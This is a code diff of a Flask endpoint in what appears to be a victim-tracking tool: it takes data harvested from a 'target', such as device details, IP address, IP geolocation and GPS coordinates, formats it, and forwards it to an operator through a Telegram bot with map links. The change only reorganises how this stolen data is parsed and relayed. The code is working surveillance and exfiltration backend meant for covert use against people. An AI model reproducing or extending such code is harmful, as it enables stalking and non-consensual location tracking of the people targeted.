@@ -142,111 +142,143 @@ def update_location():
     data = request.json or {}
     chat_id = request.args.get('id', '')
     
-    print(f"{G}[+] {C}UPDATE_LOCATIN_CALLED chat_id={chat_id} data={data}{W}")
+    print(f"{G}[+] {C}UPDATE_LOCATION_CALLED chat_id={chat_id} data={data}{W}")
 
     if chat_id and chat_id in active_sessions:
         print(f"{G}[+] {C}Sending now...{W}")
         
-        # Process data based on content type
-        msg = ""
+        # Check the type of data being sent
+        if 'embeds' in data and data['embeds']:
+            embed = data['embeds'][0]
+            
+            # System Information
+            if 'author' in embed and embed['author']['name'] == 'Target System Information..':
+                # Extract description content
+                description = embed['description']
+                
+                # Clean up the description to remove markdown formatting
+                clean_desc = description.replace('```xl\n', '').replace('```', '').replace('```autohotkey\n', '')
+                
+                # Format message for Telegram
+                msg = "*Target System Information*\n\n"
+                msg += f"*User Agent:*\n`{clean_desc.split('\n\n')[0]}`\n\n"
+                
+                # Extract system details
+                system_info = clean_desc.split('\n\n')[1] if '\n\n' in clean_desc else clean_desc
+                for line in system_info.split('\n'):
+                    if ':' in line:
+                        key, value = line.split(':', 1)
+                        msg += f"*{key.strip()}:* `{value.strip()}`\n"
+                
+                try:
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                except Exception as e:
+                    logging.error(f"Error sending system info to Telegram: {e}")
+                    # Fallback to plain text if markdown fails
+                    bot.send_message(chat_id, msg.replace('*', '').replace('`', ''))
+            
+            # IP Information
+            elif 'author' in embed and embed['author']['name'] == 'Target Ip':
+                description = embed['description']
+                
+                # Extract IP from description
+                ip_match = re.search(r'```xl\n(.+?)```', description)
+                ip = ip_match.group(1) if ip_match else "Unknown"
+                
+                # Extract IP details URL
+                ip_details_url = re.search(r'IP Details:\*\* (https?://[^\s]+)', description)
+                details_url = ip_details_url.group(1) if ip_details_url else ""
+                
+                # Get footer text
+                footer_text = ""
+                if 'footer' in embed and 'text' in embed['footer']:
+                    footer_text = embed['footer']['text']
+                
+                # Format message for Telegram
+                msg = "*Target IP Information*\n\n"
+                msg += f"*IP Address:* `{ip}`\n\n"
+                if details_url:
+                    msg += f"[IP Details]({details_url})\n\n"
+                if footer_text:
+                    msg += f"_Note: {footer_text}_"
+                
+                try:
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                except Exception as e:
+                    logging.error(f"Error sending IP info to Telegram: {e}")
+                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
+            
+            # IP Reconnaissance
+            elif 'author' in embed and embed['author']['name'] == 'IP Address Reconnaissance':
+                description = embed['description']
+                
+                # Clean up the description
+                clean_desc = description.replace('```autohotkey\n', '').replace('```', '')
+                
+                # Format message for Telegram
+                msg = "*IP Address Reconnaissance*\n\n"
+                
+                # Extract all key-value pairs
+                for line in clean_desc.split('\n'):
+                    if ':' in line:
+                        key, value = line.split(':', 1)
+                        msg += f"*{key.strip()}:* `{value.strip()}`\n"
+                
+                # If we have lat/lon coordinates, add a map link
+                lat_match = re.search(r'Lat: ([^\n]+)', clean_desc)
+                lon_match = re.search(r'Lon: ([^\n]+)', clean_desc)
+                
+                if lat_match and lon_match:
+                    lat = lat_match.group(1).strip()
+                    lon = lon_match.group(1).strip()
+                    msg += f"\n[View on Google Maps](https://www.google.com/maps?q={lat},{lon})"
+                
+                try:
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                except Exception as e:
+                    logging.error(f"Error sending IP recon to Telegram: {e}")
+                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
+            
+            # GPS Location
+            elif 'title' in embed and embed['title'] == 'GPS location of target..':
+                description = embed['description']
+                
+                # Extract lat/long from description
+                lat_match = re.search(r'Latitude:([^\n]+)', description)
+                lon_match = re.search(r'Longitude:([^\n]+)', description)
+                
+                # Format message for Telegram
+                msg = "*GPS Location of Target*\n\n"
+                
+                if lat_match and lon_match:
+                    lat = lat_match.group(1).strip()
+                    lon = lon_match.group(1).strip()
+                    
+                    msg += f"*Latitude:* `{lat}`\n"
+                    msg += f"*Longitude:* `{lon}`\n\n"
+                    msg += f"[View on Google Maps](https://www.google.com/maps/place/{lat},{lon})\n"
+                    msg += f"[View on Google Earth](https://earth.google.com/web/search/{lat},{lon})"
+                
+                # Add footer if present
+                if 'footer' in embed and 'text' in embed['footer']:
+                    msg += f"\n\n_Note: {embed['footer']['text']}_"
+                
+                try:
+                    bot.send_message(chat_id, msg, parse_mode="Markdown")
+                except Exception as e:
+                    logging.error(f"Error sending GPS info to Telegram: {e}")
+                    bot.send_message(chat_id, msg.replace('*', '').replace('`', '').replace('[', '').replace(']', ''))
         
-        # Check if it's a system info payload
-        if 'embeds' in data and data['embeds'] and 'title' in data['embeds'][0] and data['embeds'][0]['title'] == 'Uagent:':
-            # System information
-            embed = data['embeds'][0]
-            description = embed['description']
-            
-            # Extract data from the description (this is rough parsing, might need adjustment)
-            platform_match = re.search(r'Platform: ([^\n]+)', description)
-            browser_match = re.search(r'Browser_Name: ([^\n]+)', description)
-            
-            msg = f"📱 *Device Information*\n\n"
-            if platform_match:
-                msg += f"💻 *Platform*: `{platform_match.group(1)}`\n"
-            if browser_match:
-                msg += f"🌐 *Browser*: `{browser_match.group(1)}`\n"
-                
-            # Extract more details as needed
-            ram_match = re.search(r'Ram: ([^\n]+)', description)
-            cpu_match = re.search(r'CPU_cores: ([^\n]+)', description)
-            if ram_match:
-                msg += f"🧠 *RAM*: `{ram_match.group(1)}GB`\n"
-            if cpu_match:
-                msg += f"⚙️ *CPU Cores*: `{cpu_match.group(1)}`\n"
-                
-        # Check if it's an IP payload
-        elif 'embeds' in data and data['embeds'] and 'author' in data['embeds'][0] and data['embeds'][0]['author']['name'] == 'Target Ip':
-            embed = data['embeds'][0]
-            description = embed['description']
-            
-            # Extract the IP from the description 
-            ip_match = re.search(r'```xl\n(.+?)```', description)
-            if ip_match:
-                ip = ip_match.group(1)
-                msg = f"🌐 *IP Address Captured*\n\n"
-                msg += f"📍 *IP*: `{ip}`\n\n"
-                msg += f"[🔍 View IP Details](https://ip-api.com/#{ip})"
-                
-        # Check if it's a location payload
-        elif 'embeds' in data and data['embeds'] and 'title' in data['embeds'][0] and data['embeds'][0]['title'] == 'GPS location of target..':
-            embed = data['embeds'][0]
-            description = embed['description']
-            
-            # Extract lat/long from description
-            lat_match = re.search(r'Latitude:([^\n]+)', description)
-            lon_match = re.search(r'Longitude:([^\n]+)', description)
-            
-            if lat_match and lon_match:
-                lat = lat_match.group(1).strip()
-                lon = lon_match.group(1).strip()
-                
-                msg = f"🌍 *Location Captured*\n\n"
-                msg += f"📍 *Latitude*: `{lat}`\n"
-                msg += f"📍 *Longitude*: `{lon}`\n"
-                
-                # Add map URL
-                map_url = f"https://www.google.com/maps/place/{lat},{lon}"
-                msg += f"\n[📌 View on Map]({map_url})"
-                
-        # If we have a structured IP recon payload
-        elif 'embeds' in data and data['embeds'] and 'author' in data['embeds'][0] and data['embeds'][0]['author']['name'] == 'IP Address Reconnaissance':
-            embed = data['embeds'][0]
-            description = embed['description']
-            
-            # Extract details
-            country_match = re.search(r'Country: ([^\n]+)', description)
-            city_match = re.search(r'City: ([^\n]+)', description)
-            isp_match = re.search(r'Isp: ([^\n]+)', description)
-            lat_match = re.search(r'Lat: ([^\n]+)', description)
-            lon_match = re.search(r'Lon: ([^\n]+)', description)
-            
-            msg = f"🔍 *IP Reconnaissance Results*\n\n"
-            
-            if country_match:
-                msg += f"🌐 *Country*: `{country_match.group(1)}`\n"
-            if city_match:
-                msg += f"🏙️ *City*: `{city_match.group(1)}`\n"
-            if isp_match:
-                msg += f"📡 *ISP*: `{isp_match.group(1)}`\n"
-                
-            if lat_match and lon_match:
-                lat = lat_match.group(1).strip()
-                lon = lon_match.group(1).strip()
-                map_url = f"https://www.google.com/maps?q={lat},{lon}"
-                msg += f"\n[📌 View on Map]({map_url})"
-                
-        # Permission denied case
-        elif 'content' in data and 'User denied the request for Geolocation' in data['content']:
-            msg = "❌ *Target denied location permission*"
-            
-        # Default case if we can't identify the data format
-        if not msg:
-            msg = "📡 *Data received from target*\n\nUnable to parse the specific format."
-            
-        try:
+        # Permission denied message
+        elif 'content' in data and 'User denied the request for Geolocation' in data.get('content', ''):
+            msg = "*Location Permission Denied*\n\nThe target denied the request for geolocation access."
             bot.send_message(chat_id, msg, parse_mode="Markdown")
-        except Exception as e:
-            logging.error(f"Error sending to Telegram: {e}")
+        
+        # Generic message for unrecognized data
+        else:
+            logging.info(f"Received data in unknown format: {data}")
+            msg = "*Data Received*\n\nReceived information from target, but couldn't parse it into a known format."
+            bot.send_message(chat_id, msg, parse_mode="Markdown")
     
     return "OK"
 
